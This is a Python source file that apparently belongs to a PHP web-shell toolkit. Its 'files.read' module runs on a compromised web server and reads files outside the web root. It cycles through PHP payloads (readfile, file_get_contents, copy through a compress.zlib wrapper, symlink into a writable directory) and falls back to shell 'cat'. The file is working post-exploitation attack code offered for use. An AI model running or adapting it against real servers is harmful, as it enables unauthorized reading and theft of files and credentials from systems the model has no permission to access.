'''
Created on 24/ago/2011

@author: norby
'''
from core.module import Module, ModuleException

classname = 'Read'
    
class Read(Module):
    '''Read file outside the web root using different tecniquess
    files.read <path>
    '''
    
    
    php_read_vectors = { "readfile()"       : "readfile('%s');",
                "file_get_contents()"     : "print(file_get_contents('%s'));"
                }
    
    php_copy_vectors = {
                    "copy()"       : "@copy('compress.zlib://%s','%s/file.txt') && file_exists('%s/file.txt') && print(1);",
                    "symlink()"     : "@symlink('%s','%s/file.txt') && file_exists('%s/file.txt') && print(1);"
                    }
    
    shell_read_vectors = {
                   "system.exec('cat file')" : "cat %s"
                   }
                    
    
    
    visible = True
    
    def __init__(self, moddict, url, password):
        
        Module.__init__(self, moddict, url, password)
        
        self.payload = None
        self.interpreter = None
        
        moddict.load('system.exec', url, password)
        
        
    def _slack_probe(self, path):
        
        self.moddict.load('find.writable', self.url, self.password)
        self.moddict.load('system.info', self.url, self.password)
        
        doc_root = self.moddict['system.info'].run('doc_root')
        writable_dir = self.moddict['find.writable'].run('first', 'dir', doc_root)
        
        
        for name, payload in self.php_read_vectors.items():
                try:
                    
                    payload = payload % path
                    response = self.moddict['php.exec'].run(payload)
                    
                    if response:
                        self.payload = payload
                        self.interpreter = 'php.exec'
                        print "[file.read] File read using method '%s'" % name   
                        return
    
                except:
                    pass

        for name, payload in self.php_copy_vectors.items():
                try:
                    
                    payload = payload % (path, writable_dir, writable_dir)
                    response = self.moddict['php.exec'].run(payload)
                    print payload, response
                    if response:
                        self.payload = payload
                        self.interpreter = 'php.exec'
                        print "[file.read] File copied/linked to '%s/file.txt'. Try to download it via HTTP." % writable_dir
                        return
    
                except:
                    pass     
        
        for name, payload in self.shell_read_vectors.items():
                try:
                    
                    payload = payload % path
                    response = self.moddict['system.exec'].run(payload)
                    
                    if response:
                        self.payload = payload
                        self.interpreter = 'system.exec'
                        print "[file.read] File read using method '%s'" % name   
                        return
    
                except:
                    pass
                
           
        raise ModuleException("files.read",  "File read failed")
                
    def run(self, src_path):
        
        if not self.payload or not self.interpreter:
            self._slack_probe(src_path)
            
        payload = self.payload
        interpreter = self.interpreter

        return self.moddict[interpreter].run(payload)
            
            
        
